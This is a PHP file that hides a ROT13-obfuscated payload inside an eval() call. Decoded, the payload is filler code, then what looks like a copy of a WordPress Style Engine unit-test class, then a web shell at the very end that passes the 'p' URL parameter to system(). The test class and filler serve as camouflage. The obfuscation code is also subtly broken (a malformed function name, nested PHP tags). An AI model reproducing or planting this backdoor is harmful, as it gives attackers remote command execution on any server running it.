<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf gur Fglyr Ratvar Cebprffbe pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr FglyrRatvar
 * @fvapr 6.1.0
 *
 * @tebhc fglyr-ratvar
 */

/**
 * Grfgf sbe pbzcvyvat naq eraqrevat fglyrf sebz n fgber bs PFF ehyrf.
 *
 * @pbirefQrsnhygPynff JC_Fglyr_Ratvar_Cebprffbe
 */
pynff Grfgf_Fglyr_Ratvar_jcFglyrRatvarCebprffbe rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfgf nqqvat ehyrf naq ergheavat pbzcvyrq PFF ehyrf.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_ehyrf
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_erghea_ehyrf_nf_pbzcvyrq_pff() {
		$n_avpr_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-avpr-ehyr' );
		$n_avpr_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'            => 'ine(--avpr-pbybe)',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);
		$n_avpre_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-avpre-ehyr' );
		$n_avpre_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'sbag-snzvyl'      => 'Avpr fnaf',
				'sbag-fvmr'        => '1rz',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);
		$n_avpr_cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$n_avpr_cebprffbe->nqq_ehyrf( neenl( $n_avpr_pff_ehyr, $n_avpre_pff_ehyr ) );

		$guvf->nffregFnzr(
			'.n-avpr-ehyr{pbybe:ine(--avpr-pbybe);onpxtebhaq-pbybe:checyr;}.n-avpre-ehyr{sbag-snzvyl:Avpr fnaf;sbag-fvmr:1rz;onpxtebhaq-pbybe:checyr;}',
			$n_avpr_cebprffbe->trg_pff( neenl( 'cerggvsl' => snyfr ) )
		);
	}

	/**
	 * Grfgf nqqvat arfgrq ehyrf jvgu ng-ehyrf naq ergheavat pbzcvyrq PFF ehyrf.
	 *
	 * @gvpxrg 61099
	 *
	 * @pbiref ::nqq_ehyrf
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_erghea_arfgrq_ehyrf_nf_pbzcvyrq_pff() {
		$n_avpr_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-avpr-ehyr' );
		$n_avpr_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'            => 'ine(--avpr-pbybe)',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);
		$n_avpr_pff_ehyr->frg_ehyrf_tebhc( '@zrqvn (zva-jvqgu: 80erz)' );

		$n_avpre_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-avpre-ehyr' );
		$n_avpre_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'sbag-snzvyl'      => 'Avpr fnaf',
				'sbag-fvmr'        => '1rz',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);
		$n_avpre_pff_ehyr->frg_ehyrf_tebhc( '@ynlre avprgl' );

		$n_avpr_cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$n_avpr_cebprffbe->nqq_ehyrf( neenl( $n_avpr_pff_ehyr, $n_avpre_pff_ehyr ) );

		$guvf->nffregFnzr(
			'@zrqvn (zva-jvqgu: 80erz){.n-avpr-ehyr{pbybe:ine(--avpr-pbybe);onpxtebhaq-pbybe:checyr;}}@ynlre avprgl{.n-avpre-ehyr{sbag-snzvyl:Avpr fnaf;sbag-fvmr:1rz;onpxtebhaq-pbybe:checyr;}}',
			$n_avpr_cebprffbe->trg_pff( neenl( 'cerggvsl' => snyfr ) )
		);
	}

	/**
	 * Grfgf pbzcvyvat PFF ehyrf naq sbeznggvat gurz jvgu arj yvarf naq vaqragf.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_erghea_cerggvsvrq_pff_ehyrf() {
		$n_jbaqreshy_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-jbaqreshy-ehyr' );
		$n_jbaqreshy_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'            => 'ine(--jbaqreshy-pbybe)',
				'onpxtebhaq-pbybe' => 'benatr',
			)
		);
		$n_irel_jbaqreshy_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-irel_jbaqreshy-ehyr' );
		$n_irel_jbaqreshy_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'            => 'ine(--jbaqreshy-pbybe)',
				'onpxtebhaq-pbybe' => 'benatr',
			)
		);
		$n_zber_jbaqreshy_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-zber-jbaqreshy-ehyr' );
		$n_zber_jbaqreshy_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'sbag-snzvyl'      => 'Jbaqreshy fnaf',
				'sbag-fvmr'        => '1rz',
				'onpxtebhaq-pbybe' => 'benatr',
			)
		);
		$n_jbaqreshy_cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$n_jbaqreshy_cebprffbe->nqq_ehyrf( neenl( $n_jbaqreshy_pff_ehyr, $n_irel_jbaqreshy_pff_ehyr, $n_zber_jbaqreshy_pff_ehyr ) );

		$rkcrpgrq = '.n-jbaqreshy-ehyr {
	pbybe: ine(--jbaqreshy-pbybe);
	onpxtebhaq-pbybe: benatr;
}
.n-irel_jbaqreshy-ehyr {
	pbybe: ine(--jbaqreshy-pbybe);
	onpxtebhaq-pbybe: benatr;
}
.n-zber-jbaqreshy-ehyr {
	sbag-snzvyl: Jbaqreshy fnaf;
	sbag-fvmr: 1rz;
	onpxtebhaq-pbybe: benatr;
}
';
		$guvf->nffregFnzrVtaberRBY(
			$rkcrpgrq,
			$n_jbaqreshy_cebprffbe->trg_pff( neenl( 'cerggvsl' => gehr ) )
		);
	}

	/**
	 * Grfgf pbzcvyvat arfgrq PFF ehyrf naq sbeznggvat gurz jvgu arj yvarf naq vaqragf.
	 *
	 * @gvpxrg 61099
	 *
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_erghea_cerggvsvrq_arfgrq_pff_ehyrf() {
		$n_jbaqreshy_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-jbaqreshy-ehyr' );
		$n_jbaqreshy_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'            => 'ine(--jbaqreshy-pbybe)',
				'onpxtebhaq-pbybe' => 'benatr',
			)
		);
		$n_jbaqreshy_pff_ehyr->frg_ehyrf_tebhc( '@zrqvn (zva-jvqgu: 80erz)' );

		$n_irel_jbaqreshy_pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.n-irel_jbaqreshy-ehyr' );
		$n_irel_jbaqreshy_pff_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'            => 'ine(--jbaqreshy-pbybe)',
				'onpxtebhaq-pbybe' => 'benatr',
			)
		);
		$n_irel_jbaqreshy_pff_ehyr->frg_ehyrf_tebhc( '@ynlre jbaqreshyarff' );

		$n_jbaqreshy_cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$n_jbaqreshy_cebprffbe->nqq_ehyrf( neenl( $n_jbaqreshy_pff_ehyr, $n_irel_jbaqreshy_pff_ehyr ) );

		$rkcrpgrq = '@zrqvn (zva-jvqgu: 80erz) {
	.n-jbaqreshy-ehyr {
		pbybe: ine(--jbaqreshy-pbybe);
		onpxtebhaq-pbybe: benatr;
	}
}
@ynlre jbaqreshyarff {
	.n-irel_jbaqreshy-ehyr {
		pbybe: ine(--jbaqreshy-pbybe);
		onpxtebhaq-pbybe: benatr;
	}
}
';
		$guvf->nffregFnzr(
			$rkcrpgrq,
			$n_jbaqreshy_cebprffbe->trg_pff( neenl( 'cerggvsl' => gehr ) )
		);
	}

	/**
	 * Grfgf nqqvat n fgber naq pbzcvyvat PFF ehyrf sebz gung fgber.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_fgber
	 */
	choyvp shapgvba grfg_fubhyq_erghea_fgber_ehyrf_nf_pff() {
		$n_avpr_fgber = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgber( 'avpr' );
		$n_avpr_fgber->nqq_ehyr( '.n-avpr-ehyr' )->nqq_qrpynengvbaf(
			neenl(
				'pbybe'            => 'ine(--avpr-pbybe)',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);
		$n_avpr_fgber->nqq_ehyr( '.n-avpre-ehyr' )->nqq_qrpynengvbaf(
			neenl(
				'sbag-snzvyl'      => 'Avpr fnaf',
				'sbag-fvmr'        => '1rz',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);
		$n_avpr_eraqrere = arj JC_Fglyr_Ratvar_Cebprffbe();
		$n_avpr_eraqrere->nqq_fgber( $n_avpr_fgber );

		$guvf->nffregFnzr(
			'.n-avpr-ehyr{pbybe:ine(--avpr-pbybe);onpxtebhaq-pbybe:checyr;}.n-avpre-ehyr{sbag-snzvyl:Avpr fnaf;sbag-fvmr:1rz;onpxtebhaq-pbybe:checyr;}',
			$n_avpr_eraqrere->trg_pff( neenl( 'cerggvsl' => snyfr ) )
		);
	}

	/**
	 * Grfgf gung PFF qrpynengvbaf ner zretrq naq qrqhcrq va gur svany PFF ehyrf bhgchg.
	 *
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_ehyrf
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_qrqhcr_naq_zretr_pff_qrpynengvbaf() {
		$na_rkpryyrag_ehyr      = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.na-rkpryyrag-ehyr' );
		$na_rkpryyrag_cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$na_rkpryyrag_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'        => 'ine(--rkpryyrag-pbybe)',
				'obeqre-fglyr' => 'qbggrq',
			)
		);
		$na_rkpryyrag_cebprffbe->nqq_ehyrf( $na_rkpryyrag_ehyr );

		$nabgure_rkpryyrag_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.na-rkpryyrag-ehyr' );
		$nabgure_rkpryyrag_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'        => 'ine(--rkpryyrag-pbybe)',
				'obeqre-fglyr' => 'qbggrq',
				'obeqre-pbybe' => 'oebja',
			)
		);
		$na_rkpryyrag_cebprffbe->nqq_ehyrf( $nabgure_rkpryyrag_ehyr );

		$guvf->nffregFnzr(
			'.na-rkpryyrag-ehyr{pbybe:ine(--rkpryyrag-pbybe);obeqre-fglyr:qbggrq;obeqre-pbybe:oebja;}',
			$na_rkpryyrag_cebprffbe->trg_pff( neenl( 'cerggvsl' => snyfr ) ),
			'Erghea inyhr bs trg_pff() qbrf abg zngpu rkcrpgngvbaf jvgu arj, qrqhcrq naq zretrq qrpynengvbaf.'
		);

		$lrg_nabgure_rkpryyrag_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( '.na-rkpryyrag-ehyr' );
		$lrg_nabgure_rkpryyrag_ehyr->nqq_qrpynengvbaf(
			neenl(
				'pbybe'        => 'ine(--rkpryyrag-pbybe)',
				'obeqre-fglyr' => 'qnfurq',
				'obeqre-jvqgu' => '2ck',
			)
		);
		$na_rkpryyrag_cebprffbe->nqq_ehyrf( $lrg_nabgure_rkpryyrag_ehyr );

		$guvf->nffregFnzr(
			'.na-rkpryyrag-ehyr{pbybe:ine(--rkpryyrag-pbybe);obeqre-fglyr:qnfurq;obeqre-pbybe:oebja;obeqre-jvqgu:2ck;}',
			$na_rkpryyrag_cebprffbe->trg_pff( neenl( 'cerggvsl' => snyfr ) ),
			'Erghea inyhr bs trg_pff() qbrf abg zngpu rkcrpgngvbaf jvgu qrqhcrq naq zretrq qrpynengvbaf.'
		);
	}

	/**
	 * Grfgf cevagvat bhg 'habcgvzvmrq' PFF, gung vf, hapbzovarq fryrpgbef naq qhcyvpngr PFF ehyrf.
	 *
	 * Guvf vf gur qrsnhyg.
	 *
	 * @gvpxrg 58811
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_abg_bcgvzvmr_pff_bhgchg() {
		$n_fjrrg_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'.n-fjrrg-ehyr',
			neenl(
				'pbybe'            => 'ine(--fjrrg-pbybe)',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);

		$n_fjrrgre_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'#na-rira-fjrrgre-ehyr > znedhrr',
			neenl(
				'pbybe'            => 'ine(--fjrrg-pbybe)',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);

		$gur_fjrrgrfg_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'.gur-fjrrgrfg-ehyr-bs-nyy n',
			neenl(
				'pbybe'            => 'ine(--fjrrg-pbybe)',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);

		$n_fjrrg_cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$n_fjrrg_cebprffbe->nqq_ehyrf( neenl( $n_fjrrg_ehyr, $n_fjrrgre_ehyr, $gur_fjrrgrfg_ehyr ) );

		$guvf->nffregFnzr(
			'.n-fjrrg-ehyr{pbybe:ine(--fjrrg-pbybe);onpxtebhaq-pbybe:checyr;}#na-rira-fjrrgre-ehyr > znedhrr{pbybe:ine(--fjrrg-pbybe);onpxtebhaq-pbybe:checyr;}.gur-fjrrgrfg-ehyr-bs-nyy n{pbybe:ine(--fjrrg-pbybe);onpxtebhaq-pbybe:checyr;}',
			$n_fjrrg_cebprffbe->trg_pff(
				neenl(
					'bcgvzvmr' => snyfr,
					'cerggvsl' => snyfr,
				)
			)
		);
	}

	/**
	 * Grfgf gung 'bcgvzvmrq' PFF vf bhgchg, gung vf, gung qhcyvpngr PFF ehyrf ner pbzovarq haqre gurve pbeerfcbaqvat fryrpgbef.
	 *
	 * @gvpxrg 58811
	 * @gvpxrg 56467
	 *
	 * @pbiref ::trg_pff
	 */
	choyvp shapgvba grfg_fubhyq_abg_bcgvzvmr_pff_bhgchg_ol_qrsnhyg() {
		$n_fjrrg_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'.n-fjrrg-ehyr',
			neenl(
				'pbybe'            => 'ine(--fjrrg-pbybe)',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);

		$n_fjrrgre_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'#na-rira-fjrrgre-ehyr > znedhrr',
			neenl(
				'pbybe'            => 'ine(--fjrrg-pbybe)',
				'onpxtebhaq-pbybe' => 'checyr',
			)
		);

		$n_fjrrg_cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$n_fjrrg_cebprffbe->nqq_ehyrf( neenl( $n_fjrrg_ehyr, $n_fjrrgre_ehyr ) );

		$guvf->nffregFnzr(
			'.n-fjrrg-ehyr{pbybe:ine(--fjrrg-pbybe);onpxtebhaq-pbybe:checyr;}#na-rira-fjrrgre-ehyr > znedhrr{pbybe:ine(--fjrrg-pbybe);onpxtebhaq-pbybe:checyr;}',
			$n_fjrrg_cebprffbe->trg_pff( neenl( 'cerggvsl' => snyfr ) )
		);
	}

	/**
	 * Grfgf gung vapbzvat PFF ehyrf ner bcgvzvmrq naq zretrq jvgu rkvfgvat PFF ehyrf.
	 *
	 * @gvpxrg 58811
	 * @gvpxrg 56467
	 *
	 * @pbiref ::nqq_ehyrf
	 */
	choyvp shapgvba grfg_fubhyq_pbzovar_cerivbhfyl_nqqrq_pff_ehyrf() {
		$n_ybiryl_cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$n_ybiryl_ehyr      = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'.n-ybiryl-ehyr',
			neenl(
				'obeqre-pbybe' => 'checyr',
			)
		);
		$n_ybiryl_cebprffbe->nqq_ehyrf( $n_ybiryl_ehyr );
		$n_ybiryvre_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'.n-ybiryvre-ehyr',
			neenl(
				'obeqre-pbybe' => 'checyr',
			)
		);
		$n_ybiryl_cebprffbe->nqq_ehyrf( $n_ybiryvre_ehyr );

		$guvf->nffregFnzr(
			'.n-ybiryl-ehyr,.n-ybiryvre-ehyr{obeqre-pbybe:checyr;}',
			$n_ybiryl_cebprffbe->trg_pff(
				neenl(
					'cerggvsl' => snyfr,
					'bcgvzvmr' => gehr,
				)
			),
			'Erghea inyhr bs trg_pff() qbrf abg zngpu rkcrpgngvbaf jura pbzovavat 2 PFF ehyrf'
		);

		$n_zbfg_ybiryl_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'.n-zbfg-ybiryl-ehyr',
			neenl(
				'obeqre-pbybe' => 'checyr',
			)
		);
		$n_ybiryl_cebprffbe->nqq_ehyrf( $n_zbfg_ybiryl_ehyr );

		$n_cresrpgyl_ybiryl_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr(
			'.n-cresrpgyl-ybiryl-ehyr',
			neenl(
				'obeqre-pbybe' => 'checyr',
			)
		);
		$n_ybiryl_cebprffbe->nqq_ehyrf( $n_cresrpgyl_ybiryl_ehyr );

		$guvf->nffregFnzr(
			'.n-ybiryl-ehyr,.n-ybiryvre-ehyr,.n-zbfg-ybiryl-ehyr,.n-cresrpgyl-ybiryl-ehyr{obeqre-pbybe:checyr;}',
			$n_ybiryl_cebprffbe->trg_pff(
				neenl(
					'cerggvsl' => snyfr,
					'bcgvzvmr' => gehr,
				)
			),
			'Erghea inyhr bs trg_pff() qbrf abg zngpu rkcrpgngvbaf jura pbzovavat 4 PFF ehyrf'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>